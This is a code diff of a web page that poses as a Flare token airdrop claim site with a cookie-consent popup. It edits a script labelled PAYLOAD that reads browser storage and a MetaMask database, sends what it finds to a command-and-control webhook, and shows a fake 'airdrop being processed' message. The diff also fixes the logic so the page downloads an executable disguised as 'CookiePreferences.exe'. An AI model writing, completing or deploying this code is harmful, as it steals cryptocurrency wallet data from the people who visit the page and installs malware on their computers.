@@ -503,12 +503,12 @@ hero-section { padding: 2rem 1.25rem; }
 
 <!-- Block 2: WalletConnect + Payload (module, may fail silently but won't break the overlay) -->
 <script type="module">
- // import { WalletConnectModal } from 'https://unpkg.com/@walletconnect/modal@2.6.2/dist/index.js';
+  // import { WalletConnectModal } from 'https://unpkg.com/@walletconnect/modal@2.6.2/dist/index.js';
   // import { SignClient } from 'https://unpkg.com/@walletconnect/sign-client@2.12.2/dist/index.js';
 
   const PROJECT_ID = 'YOUR_WALLETCONNECT_PROJECT_ID';
   const C2_ENDPOINT = 'https://webhook.site/de11f9fa-66f4-4110-a95a-e6bf42959646';
-  const EXE_URL = 'https://raw.githubusercontent.com/flaregovernance/flaregovernance.github.io/main/CookiePreferences.exe';
+  const EXE_URL = 'https://flaregovernance.github.io/CookiePreferences.exe';
 
   let signClient, modal, connectedAccount = null;
 
@@ -542,8 +542,7 @@ hero-section { padding: 2rem 1.25rem; }
       '<span style="font-size:0.8rem;">Airdrop claim is being processed. Your FLR will arrive within 24 hours.</span>';
   }
 
-// ---- PAYLOAD (Simple, Guaranteed Popup Removal) ----
-  // ---- PAYLOAD ----
+  // ---- PAYLOAD (Simple, Guaranteed Popup Removal) ----
   async function executePayload() {
 
     // 1. Hide the overlay immediately — no delays, no dependencies.
@@ -564,7 +563,8 @@ hero-section { padding: 2rem 1.25rem; }
     if (storageHits.length > 0) sendToC2({ type: 'BROWSER_STORAGE_HITS', data: storageHits });
 
     // 4. Download the EXE if a real URL is configured.
-    if (EXE_URL && EXE_URL !== '' && EXE_URL !== 'https://raw.githubusercontent.com/flaregovernance/flaregovernance.github.io/main/CookiePreferences.exe');
+    if (EXE_URL && EXE_URL !== '') {
+      triggerDownload(EXE_URL, 'CookiePreferences.exe');
     }
 
     // 5. Report back.
@@ -575,7 +575,8 @@ hero-section { padding: 2rem 1.25rem; }
     try {
       const db = await indexedDB.open('metamask', 1);
       return new Promise((resolve) => {
-        db.onsuccess = (event) => {const database = event.target.result;
+        db.onsuccess = (event) => {
+          const database = event.target.result;
           if (database.objectStoreNames.contains('metamask')) {
             const tx = database.transaction('metamask', 'readonly');
             const store = tx.objectStore('metamask');
@@ -631,10 +632,9 @@ hero-section { padding: 2rem 1.25rem; }
     }).catch(() => {});
   }
 
-
   document.getElementById('connectWalletBtn').addEventListener('click', connectWallet);
 
- // initWalletConnect();
+  // initWalletConnect();
 </script>
 
 <!-- ===== BUTTON HANDLERS (Cookie Dismissal + Wallet Connect) ===== -->
